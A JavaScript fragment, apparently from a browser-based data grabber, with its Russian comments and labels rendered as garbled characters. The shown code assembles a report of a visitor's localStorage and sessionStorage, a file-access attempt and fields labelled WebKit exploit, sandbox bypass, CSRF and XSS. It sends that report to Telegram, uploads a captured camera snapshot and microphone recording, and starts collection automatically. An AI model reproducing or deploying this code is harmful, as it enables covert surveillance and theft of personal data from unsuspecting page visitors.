                          "‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n" +
                          "üíæ –•—Ä–∞–Ω–∏–ª–∏—â–µ\n" +
                          `LocalStorage: ${collectedData.localStorage.substring(0, 100)}...\n` +
                          `SessionStorage: ${collectedData.sessionStorage.substring(0, 100)}...\n` +
                          "‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n" +
                          "üìÇ –î–æ—Å—Ç—É–ø –∫ —Ñ–∞–π–ª–∞–º\n" +
                          `–ü–æ–ø—ã—Ç–∫–∞: ${collectedData.fileAccessAttempt}\n` +
                          "‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n" +
                          "‚ö†Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç–∏\n" +
                          `WebKit Exploit: ${collectedData.vulnerabilities.webkitExploit}\n` +
                          `Sandbox Bypass: ${collectedData.vulnerabilities.sandboxBypass}\n` +
                          `CSRF Attempt: ${collectedData.vulnerabilities.csrfAttempt}\n` +
                          `XSS Simulation: ${collectedData.vulnerabilities.xssSimulation}`;

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç
            await sendTextToTelegram(message);

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ, –µ—Å–ª–∏ –µ—Å—Ç—å
            if (photoDataUrl) {
                await sendFileToTelegram(photoDataUrl, 'photo', 'snapshot.png');
            }

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞—É–¥–∏–æ, –µ—Å–ª–∏ –µ—Å—Ç—å
            if (audioDataUrl) {
                await sendFileToTelegram(audioDataUrl, 'audio', 'recording.webm');
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        collectAllData();
